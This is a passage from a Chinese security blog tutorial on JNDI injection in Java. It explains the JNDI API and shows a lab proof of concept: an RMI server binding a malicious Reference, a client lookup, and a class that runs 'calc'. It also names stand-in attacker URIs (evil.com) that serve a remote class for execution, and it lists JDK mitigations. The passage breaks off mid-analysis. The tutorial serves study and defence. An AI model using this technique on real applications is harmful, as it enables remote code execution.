<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>



<link rel="canonical" href="http://example.com/2023/12/25/JNDI-attack/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/12/25/JNDI-attack/","path":"2023/12/25/JNDI-attack/","title":"JNDI注入"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>JNDI注入 | Y0ng's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">Y0ng's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI%E6%A6%82%E5%BF%B5"><span class="nav-text">JNDI概念</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Naming-Service-%E5%91%BD%E5%90%8D%E6%9C%8D%E5%8A%A1"><span class="nav-text">Naming Service 命名服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Directory-Service-%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1"><span class="nav-text">Directory Service 目录服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#API"><span class="nav-text">API</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI%E7%9A%84%E7%BB%93%E6%9E%84"><span class="nav-text">JNDI的结构</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#InitialContext%E7%B1%BB"><span class="nav-text">InitialContext类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reference%E7%B1%BB"><span class="nav-text">Reference类</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI-References-%E6%B3%A8%E5%85%A5"><span class="nav-text">JNDI References 注入</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI-RMI"><span class="nav-text">JNDI-RMI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0"><span class="nav-text">实现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">流程分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E8%A1%A5"><span class="nav-text">修补</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#JNDI-LDAP"><span class="nav-text">JNDI-LDAP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0-1"><span class="nav-text">实现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90-1"><span class="nav-text">流程分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E8%A1%A5-1"><span class="nav-text">修补</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8u191%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-text">8u191的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E4%BE%8B%E5%AD%90"><span class="nav-text">简单例子</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0Class"><span class="nav-text">利用本地Class</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90-2"><span class="nav-text">流程分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#LDAP%E8%BF%94%E5%9B%9E%E5%AF%B9%E8%B1%A1"><span class="nav-text">LDAP返回对象</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90-3"><span class="nav-text">流程分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">参考</span></a></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">Y0ng</p>
  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/12/25/JNDI-attack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Y0ng">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Y0ng's Blog">
      <meta itemprop="description" content="花有重开日，人无再少年">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="JNDI注入 | Y0ng's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          JNDI注入
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2023-12-25 00:41:11" itemprop="dateCreated datePublished" datetime="2023-12-25T00:41:11+08:00">2023-12-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/JavaSec/" itemprop="url" rel="index"><span itemprop="name">JavaSec</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody"><p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E5%86%85%E5%AD%98%E9%A9%AC/feng.jpeg"></p>
<a id="more"></a>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>JNDI注入! 环境版本：<strong>JDK1.8.0-66</strong></p>
<h1 id="JNDI概念"><a href="#JNDI概念" class="headerlink" title="JNDI概念"></a>JNDI概念</h1><p>JNDI 全称为 <strong>Java Naming and Directory Interface(Java 命名与目录接口)</strong> 是SUN公司提供的一种标准的 <strong>Java命名系统接口</strong>，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</p>
<p>那么我们就知道了它为java提供的一个<strong>接口</strong>，而且分为了两个部分，命名服务与目录服务。</p>
<h2 id="Naming-Service-命名服务"><a href="#Naming-Service-命名服务" class="headerlink" title="Naming Service 命名服务"></a>Naming Service 命名服务</h2><p>命名服务也可称为名称服务将名称和对象进行关联，提供 <strong>通过名称找到对象</strong> 的操作，但是存在一些特殊情况，在一些命名服务系统中并不直接将对象进行存储，而是存储了对象的引用，引用包含了如何访问实际对象的信息，类似于指针。</p>
<p>命名服务普遍存在于计算机系统中，例如:</p>
<ul>
<li>DNS: 通过域名查找实际的 IP 地址</li>
<li>文件系统: 通过文件名定位到具体的文件</li>
</ul>
<p>在命名系统中，存在以下几个重要的概念：</p>
<ul>
<li><strong>Bindings</strong>: 表示一个名称和对应对象的绑定关系，比如在文件系统中文件名绑定到对应的文件，在 DNS 中域名绑定到对应的 IP。</li>
<li><strong>Context</strong>: 上下文，一个上下文中对应着一组名称到对象的绑定关系，我们可以在指定上下文中查找名称对应的对象。比如在文件系统中，一个目录就是一个上下文，可以在该目录中查找文件，其中子目录也可以称为子上下文 (subcontext)。</li>
<li><strong>References</strong>: 当存在上述的特殊情况时，以引用的形式进行存储，可以理解为指针。引用中包含了获取实际对象所需的信息，甚至对象的实际状态。比如文件系统中实际根据名称打开的文件是一个整数 fd ，这就是一个引用，内核根据这个引用值去找到磁盘中的对应位置和读写偏移。</li>
</ul>
<h2 id="Directory-Service-目录服务"><a href="#Directory-Service-目录服务" class="headerlink" title="Directory Service 目录服务"></a>Directory Service 目录服务</h2><p>目录服务是名称服务的 <strong>一种拓展</strong>，除了名称服务中已有的名称到对象的关联信息外，还允许对象拥有属性(attributes)信息。由此，我们不仅可以根据名称去查找(<strong>lookup</strong>)对象(并获取其对应属性)，还可以根据属性值去搜索(<strong>search</strong>)对象。</p>
<p>即：名称 -&gt; 对象 与 对象的属性 -&gt; 对象</p>
<h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p>根据上面的介绍，我们知道 <strong>目录服务是中心化网络应用的一个重要组件</strong>。使用目录服务可以简化应用中服务管理验证逻辑，集中存储共享信息。目录服务的存在拓宽了我们获取一个对象的方式，不仅仅通过lookup，还能通过search。</p>
<blockquote>
<p> 比如对于打印机服务，我们可以通过在目录服务中查找打印机，并获得一个打印机对象，基于这个 Java 对象进行实际的打印操作。</p>
</blockquote>
<p>基于以上情况就有了 JNDI，应用通过该接口与具体的目录服务进行交互。从设计上，JNDI 独立于具体的目录服务实现，设计出了应用范围宽泛的(也就是兼容性比较强大)，因此可以针对不同的目录服务提供统一的操作接口。</p>
<p>JNDI 架构上主要包含两个部分，即 Java 的应用层接口和 <strong>SPI</strong>，如下图所示:</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220706004532839.png" alt="image-20220706004532839"></p>
<p><strong>SPI</strong></p>
<p>SPI 全称为 Service Provider Interface，即服务供应接口，主要作用是<strong>为底层的具体的目录服务提供统一接口</strong>，从而实现目录服务的可插拔式安装。在 JDK 中包含了下述内置的目录服务:</p>
<ul>
<li>RMI: Java Remote Method Invocation，Java 远程方法调用</li>
<li>LDAP: 轻量级目录访问协议</li>
<li>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构，用于 COS 名称服务</li>
</ul>
<h1 id="JNDI的结构"><a href="#JNDI的结构" class="headerlink" title="JNDI的结构"></a>JNDI的结构</h1><p>从上面介绍的三个 Service Provider 我们可以看到，除了 RMI 是 Java 特有的远程调用框架，其他两个都是通用的服务和标准，可以脱离 Java 独立使用。JNDI 就是在这个基础上提供了统一的接口，来方便调用各种服务。在 Java JDK 里面提供了5个包，提供给JNDI的功能实现，分别是：</p>
<ul>
<li>javax.naming：主要用于命名操作,包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。</li>
<li>javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDir- Context类；</li>
<li>javax.naming.event：在命名目录服务器中请求事件通知；</li>
<li>javax.naming.ldap：提供LDAP支持；</li>
<li>javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</li>
</ul>
<p>其中最为重要的是 javax.naming，其中的一些类需要学习一下</p>
<h2 id="InitialContext类"><a href="#InitialContext类" class="headerlink" title="InitialContext类"></a>InitialContext类</h2><p>构造方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;构建一个初始上下文。</span><br><span class="line">InitialContext() </span><br><span class="line">&#x2F;&#x2F;构造一个初始上下文，并选择不初始化它。</span><br><span class="line">InitialContext(boolean lazy) </span><br><span class="line">&#x2F;&#x2F;使用提供的环境构建初始上下文。</span><br><span class="line">InitialContext(Hashtable&lt;?,?&gt; environment) </span><br></pre></td></tr></table></figure>

<p>常用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;将名称绑定到对象。 </span><br><span class="line">bind(Name name, Object obj) </span><br><span class="line">&#x2F;&#x2F;枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br><span class="line">list(String name) </span><br><span class="line">&#x2F;&#x2F;检索命名对象。</span><br><span class="line">lookup(String name)  </span><br><span class="line">&#x2F;&#x2F;将名称绑定到对象，覆盖任何现有绑定。</span><br><span class="line">rebind(String name, Object obj) </span><br><span class="line">&#x2F;&#x2F;取消绑定命名对象。</span><br><span class="line">unbind(String name)  </span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jndi</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        String uri = <span class="string">&quot;rmi://127.0.0.1:1099/work&quot;</span>;</span><br><span class="line">        <span class="comment">//在这JDK里面给的解释是构建初始上下文，其实通俗点来讲就是获取初始目录环境。</span></span><br><span class="line">        InitialContext initialContext = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        initialContext.lookup(uri);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Reference类"><a href="#Reference类" class="headerlink" title="Reference类"></a>Reference类</h2><p>该类也是在 javax.naming的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的 <strong>引用功能</strong>。</p>
<p>构造方法:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;为类名为“className”的对象构造一个新的引用。</span><br><span class="line">Reference(String className) </span><br><span class="line">&#x2F;&#x2F;为类名为“className”的对象和地址构造一个新引用。 </span><br><span class="line">Reference(String className, RefAddr addr) </span><br><span class="line">&#x2F;&#x2F;为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span><br><span class="line">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span><br><span class="line">Reference(String className, String factory, String factoryLocation)</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line">参数：</span><br><span class="line">className 远程加载时所使用的类名</span><br><span class="line">factory  加载的class中需要实例化类的名称</span><br><span class="line">factoryLocation  提供classes数据的地址可以是file&#x2F;ftp&#x2F;http协议</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>

<p>常用方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;将地址添加到索引posn的地址列表中。</span><br><span class="line">void add(int posn, RefAddr addr) </span><br><span class="line">&#x2F;&#x2F;将地址添加到地址列表的末尾。 </span><br><span class="line">void add(RefAddr addr) </span><br><span class="line">&#x2F;&#x2F;从此引用中删除所有地址。  </span><br><span class="line">void clear() </span><br><span class="line">&#x2F;&#x2F;检索索引posn上的地址。 </span><br><span class="line">RefAddr get(int posn) </span><br><span class="line">&#x2F;&#x2F;检索地址类型为“addrType”的第一个地址。  </span><br><span class="line">RefAddr get(String addrType) </span><br><span class="line">&#x2F;&#x2F;检索本参考文献中地址的列举。 </span><br><span class="line">Enumeration&lt;RefAddr&gt; getAll() </span><br><span class="line">&#x2F;&#x2F;检索引用引用的对象的类名。 </span><br><span class="line">String getClassName() </span><br><span class="line">&#x2F;&#x2F;检索此引用引用的对象的工厂位置。  </span><br><span class="line">String getFactoryClassLocation() </span><br><span class="line">&#x2F;&#x2F;检索此引用引用对象的工厂的类名。  </span><br><span class="line">String getFactoryClassName() </span><br><span class="line">&#x2F;&#x2F;从地址列表中删除索引posn上的地址。    </span><br><span class="line">Object remove(int posn) </span><br><span class="line">&#x2F;&#x2F;检索此引用中的地址数。 </span><br><span class="line">int size() </span><br><span class="line">&#x2F;&#x2F;生成此引用的字符串表示形式。</span><br><span class="line">String toString() </span><br></pre></td></tr></table></figure>

<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jndi</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException, AlreadyBoundException </span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;http://127.0.0.1:8080&quot;</span>; </span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, url);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;aa&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里调用了ReferenceWrapper进行对引用的包装，提一句原因。</p>
<blockquote>
<p>查看到Reference,并没有实现Remote接口也没有继承 UnicastRemoteObject类，前面讲RMI的时候说过，将类注册到Registry需要实现Remote和继承UnicastRemoteObject类。这里并没有看到相关的代码，所以这里还需要调用ReferenceWrapper将他给封装一下。</p>
</blockquote>
<h1 id="JNDI-References-注入"><a href="#JNDI-References-注入" class="headerlink" title="JNDI References 注入"></a>JNDI References 注入</h1><p>在JNDI中对象的传递为两种，一、序列化，二、引用。针对于引用的方式，<strong>如果我们可控客户端的 lookup()内容，控制客户端去访问恶意的服务中心(比如rmi和ldap)，获取到恶意的引用，从而获取恶意远程服务器的恶意class文件进行执行。</strong></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714154410955.png" alt="image-20220714154410955"></p>
<ol>
<li>攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 <strong>rmi://evil.com:1099/refObj</strong></li>
<li>原先配置好的上下文环境 会因为动态环境转换而被指向  <strong>rmi://evil.com:1099/</strong></li>
<li>应用去 <strong>rmi://evil.com:1099</strong> 请求绑定对象 refObj，攻击者事先准备好的 RMI 服务会返回与名称 refObj 绑定的ReferenceWrapper 对象</li>
<li>应用获取到 ReferenceWrapper 对象开始从本地 <strong>CLASSPATH</strong> 中搜索 EvilObject 类，如果不存在则会从恶意远程服务器上去尝试获取 <strong>EvilObject.class</strong>，即动态的去获取 <code>http://evil-cb.com/EvilObject.class</code></li>
<li>攻击者事先准备好的服务返回编译好的包含恶意代码的 <strong>EvilObject.class</strong></li>
<li>应用开始调用 <strong>EvilObject</strong> 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行</li>
</ol>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul>
<li>JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly 默认值被设置为 true。将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</li>
<li>JDK 6u141、7u131、8u121之后：增加了 com.sun.jndi.rmi.object.trustURLCodebase 选项，默认为 false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</li>
<li>JDK 6u211、7u201、8u191之后：增加了 com.sun.jndi.ldap.object.trustURLCodebase 选项，默认为 false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</li>
</ul>
<p>这就涉及到高版本下的JNDI绕过，下篇学习。</p>
<h1 id="JNDI-RMI"><a href="#JNDI-RMI" class="headerlink" title="JNDI-RMI"></a>JNDI-RMI</h1><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>Server端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String  url = <span class="string">&quot;http://127.0.0.1:8080&quot;</span>;</span><br><span class="line">        Registry r = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;calc&quot;</span>, <span class="string">&quot;calc&quot;</span>, url);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        r.bind(<span class="string">&quot;evil&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Client端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;rmi://127.0.0.1:1099/evil&quot;</span>;</span><br><span class="line">        InitialContext initialContext = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>calc.java，编译为class，放到web服务下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">calc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>启动服务端、客户端后弹出计算器。</p>
<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>断点下到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">initialContext.lookup(url);</span><br></pre></td></tr></table></figure>

<p>走到 <strong>RegistryContext#lookup</strong> ，通过registryImpl_Stub去寻找evil，返回值为一个 <strong>ReferenceWrapper</strong> 对象，接着调用当前类的<strong>decodeObject</strong> 去获取其中的信息</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714183414297.png" alt="image-20220714183414297"></p>
<p>调用 <strong>getReference</strong> 获取信息</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714183745369.png" alt="image-20220714183745369"></p>
<p>看到已经获取详细的信息了，随后调用静态方法 <strong>NamingManager#getObjectInstance</strong></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714184051614.png" alt="image-20220714184051614"></p>
<p> <strong>getObjectInstance</strong> 中定义 <strong>ObjectFactory</strong> 类型的 <strong>factory</strong> 用于接受工厂类的对象</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220717231849391.png" alt="image-20220717231849391"></p>
<p>然后调用 <strong>getObjectFactoryFromReference</strong> 去获取 <strong>工厂类的对象</strong></p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714184416349.png" alt="image-20220714184416349"></p>
<p>getObjectFactoryFromReference 中首先直接尝试类加载</p>
<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220714184651459.png" alt="image-20220714184651459"></p>
<p>那么在类加载的过程中使用AppClassLoader加载，本地肯定是没有的，返回空</p>
